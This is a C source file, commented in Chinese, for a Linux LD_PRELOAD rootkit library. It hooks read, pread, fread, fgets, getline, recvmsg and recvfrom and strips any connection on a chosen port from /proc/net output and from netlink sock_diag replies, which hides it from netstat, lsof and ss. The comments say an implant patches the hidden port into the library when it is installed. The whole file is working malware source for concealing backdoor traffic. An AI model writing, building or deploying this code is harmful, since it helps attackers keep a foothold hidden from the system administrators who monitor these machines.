/*
 * hide_net.c - LD_PRELOAD 网络连接隐藏库（Linux）
 *
 * 双通道过滤，覆盖现代主流连接查看工具：
 *   1) /proc/net 过滤：hook read/pread/fread，内容级过滤 /proc/net/tcp{,6},udp{,6}
 *      中指定端口连接行（cat / lsof / 旧版 netstat 等基于 /proc 的工具不可见）。
 *   2) netlink sock_diag 过滤：hook read/pread/recvmsg/recvfrom，对 AF_NETLINK
 *      套接字解析 NETLINK_SOCK_DIAG(inet_diag) 消息流，按 idiag_sport/idiag_dport
 *      丢弃命中消息（ss / 新版 netstat 不可见）。
 *
 * 端口注入：库内嵌占位符 "HIDEPORT00000000"（HIDEPORT + 8 位 hex，右对齐），
 * 由植入体安装时按字节替换为实际端口（如端口 443 -> "000001BB"）。
 *
 * 兼容性说明：
 *   - inet_diag_msg 布局差异：现代内核（>=5.4，id 位于偏移 4，sport@4/dport@6）
 *     与老内核（id 位于偏移 24，sport@24/dport@26）同时校验（family 字节均在
 *     payload[0]，且两布局消息总长均为 40 字节无法按长度区分）。
 *   - 静态链接程序不受 LD_PRELOAD 影响（用户态过滤边界）。
 *
 * 构建（由 build_templates.sh 执行，宿主机 gcc）：
 *   gcc -shared -fPIC -O2 -o hide_net_linux_amd64.so hide_net.c -ldl
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/sock_diag.h>
#include <linux/inet_diag.h>

/* 端口占位符：安装时被植入体 patch 为 8 位 hex（右对齐，如 000001BB） */
static char hidden_port_str[] = "HIDEPORT00000000";
static unsigned long hidden_port = 0;
static int hidden_port_ready = 0;

static int char2hex(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

static int ishex(char c) {
    return (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F');
}

static void resolve_hidden_port(void) {
    if (hidden_port_ready) return;
    hidden_port_ready = 1;
    /* 未 patch 时 hex 部分为 8 个 '0'。
       注意：不能与字符串字面量 "HIDEPORT00000000" 做 memcmp 判断——植入体安装时
       会替换 .so 内全部占位符副本（含比较字面量自身），字面量被同步改写后比较恒真。 */
    int zero = 1;
    for (int i = 8; i < 16; i++) {
        if (hidden_port_str[i] != '0') { zero = 0; break; }
    }
    if (zero) {
        hidden_port = 0;
        return;
    }
    char *end = NULL;
    hidden_port = strtoul(hidden_port_str + 8, &end, 16);
    if (end == hidden_port_str + 8 || hidden_port == 0 || hidden_port > 0xFFFF) {
        hidden_port = 0;
    }
}

/* ============ 通道 1：/proc/net 内容过滤 ============ */

/* /proc/net 行格式："  sl: local_addr:port rem_addr:port state ..." */
/* 返回 1 表示该行应被隐藏（本地或远端端口命中） */
static int line_should_hide(const char *line) {
    if (hidden_port == 0) return 0;
    /* 跳过空白与序号（sl），到达第一个 ':'（序号分隔符） */
    const char *p = line;
    while (*p == ' ' || *p == '\t') p++;
    if (*p < '0' || *p > '9') return 0; /* 不是地址行（如头行/空行） */
    while (*p && *p != ':') p++;
    if (*p != ':') return 0;
    p++;
    /* 跳过本地地址（8 位 hex），到达第二个 ':' */
    while (*p && *p != ':') p++;
    if (*p != ':') return 0;
    p++;
    /* 本地端口：4 位 hex */
    unsigned long lport = 0;
    for (int i = 0; i < 4 && *p && *p != ' '; i++) {
        lport = (lport << 4) | (unsigned long)char2hex(*p);
        if (*p) p++;
    }
    if (lport == hidden_port) return 1;
    /* 跳过远端地址 */
    while (*p && *p != ':') p++;
    if (*p != ':') return 0;
    p++;
    unsigned long rport = 0;
    for (int i = 0; i < 4 && *p && *p != ' '; i++) {
        rport = (rport << 4) | (unsigned long)char2hex(*p);
        if (*p) p++;
    }
    return (rport == hidden_port) ? 1 : 0;
}

/* 判断缓冲区是否疑似 /proc/net/tcp 内容（含 ":XXXX " 形态） */
static int looks_like_procnet(const char *buf, size_t len) {
    size_t i;
    for (i = 0; i + 8 < len; i++) {
        if (buf[i] == ':' && ishex(buf[i+1]) && ishex(buf[i+2]) &&
            ishex(buf[i+3]) && ishex(buf[i+4]) && (buf[i+5] == ' ')) {
            return 1;
        }
    }
    return 0;
}

/* 就地过滤：删除命中行，返回过滤后长度 */
static size_t procnet_filter(char *buf, size_t len) {
    size_t read = 0, write = 0;
    while (read < len) {
        size_t eol = read;
        while (eol < len && buf[eol] != '\n') eol++;
        if (eol >= len) {
            /* 最后一行无换行 */
            if (!line_should_hide(buf + read)) {
                memmove(buf + write, buf + read, len - read);
                write += len - read;
            }
            break;
        }
        size_t line_len = eol - read + 1; /* 含换行 */
        if (!line_should_hide(buf + read)) {
            memmove(buf + write, buf + read, line_len);
            write += line_len;
        }
        read = eol + 1;
    }
    return write;
}

/* ============ 通道 2：netlink sock_diag 消息过滤 ============ */

/* 判断 fd 是否为 AF_NETLINK 套接字（getsockname，失败视为非 netlink） */
static int is_netlink(int fd) {
    struct sockaddr sa;
    socklen_t sl = sizeof(sa);
    if (getsockname(fd, &sa, &sl) != 0) return 0;
    return sa.sa_family == AF_NETLINK;
}

/* 就地过滤 netlink 消息流：删除命中端口的 inet_diag 消息，返回过滤后长度。
 * 保留 NLMSG_DONE/NLMSG_ERROR（ss 依赖其判断 dump 结束，删除会导致挂起）。
 * 畸形消息（nlmsg_len 非法/截断）整体保留，不做内容改写。 */
static size_t netlink_filter(char *buf, size_t len) {
    if (hidden_port == 0 || len < NLMSG_HDRLEN) return len;
    size_t read = 0, write = 0;
    while (read + NLMSG_HDRLEN <= len) {
        struct nlmsghdr *hdr = (struct nlmsghdr *)(buf + read);
        if (hdr->nlmsg_len < NLMSG_HDRLEN) return len;          /* 畸形：整体透传 */
        if (hdr->nlmsg_len > len - read) return len;            /* 截断：整体透传 */
        size_t msg_len = NLMSG_ALIGN(hdr->nlmsg_len);

        int drop = 0;
        if (hdr->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
            hdr->nlmsg_len >= NLMSG_HDRLEN + 28) {
            char *p = buf + read + NLMSG_HDRLEN;
            /* 两布局 family 均在 payload[0]（AF_INET=2 / AF_INET6=10） */
            unsigned char family = (unsigned char)p[0];
            if (family == 2 || family == 10) {
                /* 现代内核布局：id@4 → sport@4/dport@6 */
                unsigned long s1 = (unsigned long)ntohs(*(unsigned short *)(p + 4));
                unsigned long d1 = (unsigned long)ntohs(*(unsigned short *)(p + 6));
                /* 老内核布局：id@24 → sport@24/dport@26（校验相邻字节不为端口界内
                   的巧合值；两布局不能按消息长度区分，故双偏移都查，误命中概率极低） */
                unsigned long s2 = (unsigned long)ntohs(*(unsigned short *)(p + 24));
                unsigned long d2 = (unsigned long)ntohs(*(unsigned short *)(p + 26));
                if (s1 == hidden_port || d1 == hidden_port ||
                    s2 == hidden_port || d2 == hidden_port) {
                    drop = 1;
                }
            }
        }

        if (!drop) {
            if (write != read) memmove(buf + write, buf + read, msg_len);
            write += msg_len;
        }
        read += msg_len;
    }
    return write;
}

/* ============ 钩子 ============ */
static ssize_t (*real_read)(int, void *, size_t) = NULL;
static size_t (*real_fread)(void *, size_t, size_t, FILE *) = NULL;
static ssize_t (*real_pread)(int, void *, size_t, off_t) = NULL;
static ssize_t (*real_recvmsg)(int, struct msghdr *, int) = NULL;
static ssize_t (*real_recvfrom)(int, void *, size_t, int, struct sockaddr *, socklen_t *) = NULL;
static char *(*real_fgets)(char *, int, FILE *) = NULL;
static ssize_t (*real_getline)(char **, size_t *, FILE *) = NULL;

static void resolve_real(void) {
    if (!real_read) real_read = (ssize_t (*)(int, void *, size_t)) dlsym(RTLD_NEXT, "read");
    if (!real_fread) real_fread = (size_t (*)(void *, size_t, size_t, FILE *)) dlsym(RTLD_NEXT, "fread");
    if (!real_pread) real_pread = (ssize_t (*)(int, void *, size_t, off_t)) dlsym(RTLD_NEXT, "pread");
    if (!real_recvmsg) real_recvmsg = (ssize_t (*)(int, struct msghdr *, int)) dlsym(RTLD_NEXT, "recvmsg");
    if (!real_recvfrom) real_recvfrom = (ssize_t (*)(int, void *, size_t, int, struct sockaddr *, socklen_t *)) dlsym(RTLD_NEXT, "recvfrom");
    if (!real_fgets) real_fgets = (char *(*)(char *, int, FILE *)) dlsym(RTLD_NEXT, "fgets");
    if (!real_getline) real_getline = (ssize_t (*)(char **, size_t *, FILE *)) dlsym(RTLD_NEXT, "getline");
}

ssize_t read(int fd, void *buf, size_t count) {
    resolve_real();
    resolve_hidden_port();
    ssize_t n = real_read(fd, buf, count);
    if (n > 0 && hidden_port > 0) {
        if (is_netlink(fd)) {
            n = (ssize_t) netlink_filter((char *)buf, (size_t)n);
        } else if (looks_like_procnet((const char *)buf, (size_t)n)) {
            n = (ssize_t) procnet_filter((char *)buf, (size_t)n);
        }
    }
    return n;
}

ssize_t pread(int fd, void *buf, size_t count, off_t offset) {
    resolve_real();
    resolve_hidden_port();
    ssize_t n = real_pread(fd, buf, count, offset);
    if (n > 0 && hidden_port > 0) {
        if (is_netlink(fd)) {
            n = (ssize_t) netlink_filter((char *)buf, (size_t)n);
        } else if (looks_like_procnet((const char *)buf, (size_t)n)) {
            n = (ssize_t) procnet_filter((char *)buf, (size_t)n);
        }
    }
    return n;
}

size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    resolve_real();
    resolve_hidden_port();
    size_t n = real_fread(ptr, size, nmemb, stream);
    size_t bytes = n * size;
    if (bytes > 0 && hidden_port > 0 && looks_like_procnet((const char *)ptr, bytes)) {
        size_t filtered = procnet_filter((char *)ptr, bytes);
        n = filtered / size;
    }
    return n;
}

/* fgets/getline 钩子：stdio 行式读取（netstat/lsof 等 fopen+fgets 读 /proc/net 系列文件）。
 * glibc stdio 内部 read 绕过 read 符号插桩，但 fgets 本身走 PLT 可拦截。
 * 命中行直接消费（返回下一行），调用方无感知。 */
char *fgets(char *s, int size, FILE *stream) {
    resolve_real();
    resolve_hidden_port();
    for (;;) {
        char *r = real_fgets(s, size, stream);
        if (r == NULL || hidden_port == 0) return r;
        if (line_should_hide(s)) continue;
        return r;
    }
}

ssize_t getline(char **lineptr, size_t *n, FILE *stream) {
    resolve_real();
    resolve_hidden_port();
    for (;;) {
        ssize_t r = real_getline(lineptr, n, stream);
        if (r < 0 || hidden_port == 0) return r;
        if (*lineptr && line_should_hide(*lineptr)) continue;
        return r;
    }
}

ssize_t recvmsg(int fd, struct msghdr *msg, int flags) {
    resolve_real();
    resolve_hidden_port();
    ssize_t n = real_recvmsg(fd, msg, flags);
    if (n > 0 && hidden_port > 0 && msg && msg->msg_iov && msg->msg_iovlen > 0 &&
        is_netlink(fd)) {
        void *base = msg->msg_iov[0].iov_base;
        size_t cap = msg->msg_iov[0].iov_len;
        if (base && (size_t)n <= cap) {
            n = (ssize_t) netlink_filter((char *)base, (size_t)n);
        }
    }
    return n;
}

ssize_t recvfrom(int fd, void *buf, size_t len, int flags, struct sockaddr *src_addr, socklen_t *addrlen) {
    resolve_real();
    resolve_hidden_port();
    ssize_t n = real_recvfrom(fd, buf, len, flags, src_addr, addrlen);
    if (n > 0 && hidden_port > 0 && is_netlink(fd)) {
        n = (ssize_t) netlink_filter((char *)buf, (size_t)n);
    }
    return n;
}
